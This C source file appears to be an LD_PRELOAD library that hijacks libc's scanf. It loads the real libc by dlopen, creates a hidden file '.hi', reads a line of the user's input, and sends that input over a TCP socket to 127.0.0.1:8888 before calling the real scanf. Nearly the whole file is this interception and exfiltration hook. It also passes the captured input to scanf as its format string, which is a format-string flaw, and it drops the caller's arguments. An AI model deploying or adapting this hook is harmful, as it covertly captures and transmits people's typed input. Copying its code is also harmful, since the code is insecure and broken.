#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>	//printf
#include <string.h>	//strlen
#include <sys/socket.h>	//socket
#include <arpa/inet.h>	//inet_addr
#include <unistd.h>

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define HIDDEN_FILE ".hi"

typedef int (*sym)(const char *, ...);
void* handle;
FILE* fd;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));

void myinit() 
{
	fd = fopen(HIDDEN_FILE,"w");
    handle = dlopen(OBJ_PATH,RTLD_LAZY);
}

void mydest() 
{
    dlclose(handle);
    fclose(fd);
}

int scanf ( const char * format, ... ){
	sym orig_scanf;
	printf("hello from the other side \n");
	orig_scanf = (sym)dlsym(handle,"scanf");
	va_list arg;
	va_start (arg, format);
	char buf[1000]  = {'\0'};
	char out[1000]  = {'\0'};
	int happend = 0;
	while ( fgets(buf, 1000, stdin) != NULL && happend == 0) {
		strncpy(out, buf, 1000);
		happend++;
	}
	va_end(arg);
	
	struct sockaddr_in server;
	int sock;
	char message[1000] , answer[2000];
	sock = socket(AF_INET , SOCK_STREAM , 0);
	if ( sock  == -1){
		printf("Could not create socket");
	}

	puts("Socket created");
	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_family = AF_INET;
	server.sin_port = htons( 8888 );
	
	if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0){
		perror("connect failed. Error");
		return 1;
	}

	int got =0;
	while(got == 0){
		if( send(sock , out , strlen(out) , 0) < 0)
		{
			puts("Send failed");
			return 1;
		}
		if( recv(sock , answer , 2000 , 0) < 0)
		{
			puts("recv failed");
			break;
		}
		got++;
	}

	close(sock);
	printf("done");

	format = out;

	return orig_scanf(format);
}
